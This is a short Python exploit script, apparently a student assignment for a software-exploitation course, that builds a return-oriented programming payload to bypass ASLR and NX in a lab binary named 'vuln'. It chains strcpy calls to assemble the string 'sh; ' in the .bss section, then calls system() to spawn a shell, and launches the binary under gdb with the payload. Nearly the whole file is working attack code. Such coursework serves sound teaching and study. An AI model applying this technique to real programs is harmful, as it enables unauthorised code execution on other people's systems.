#!/usr/bin/python

# Steven Comer
# CSC 791: Special Topics in Software Exploitation
# Cycle 4: Protection Bypass of ASLR and NX
# Contents: Python script to build ROP payload and exploit vuln binary
# Modified: 24 April 2016

from struct import pack
from os import system

# addresses
overflow_length = 1028
junk = 'A'*overflow_length
_ppr=pack("<L",0x080484ba)
_system=pack("<L",0x80482f0)
_strcpy=pack("<L",0x80482e0)
_bss0=pack("<L",0x080496f0)
_bss1=pack("<L",0x080496f1)
_bss2=pack("<L",0x080496f2)
_bss3=pack("<L",0x080496f3)
_char_s=pack("<L",0x08048142)
_char_h=pack("<L",0x080482e6)
_char_semi=pack("<L",0x080484ef)
_char_space=pack("<L",0x08048018)

# building the payload
p = junk
p += _strcpy
p += _ppr
p += _bss0
p += _char_s
p += _strcpy
p += _ppr
p += _bss1
p += _char_h
p += _strcpy
p += _ppr
p += _bss2
p += _char_semi
p += _strcpy
p += _ppr
p += _bss3
p += _char_space
p += _system
p += "AAAA"
p += _bss0			# bss now contains "sh; <junk>"

# execute the program with the payload as an argument
system("gdb --args ./vuln \""+p+"\"")
#system("./vuln \""+p+"\"")


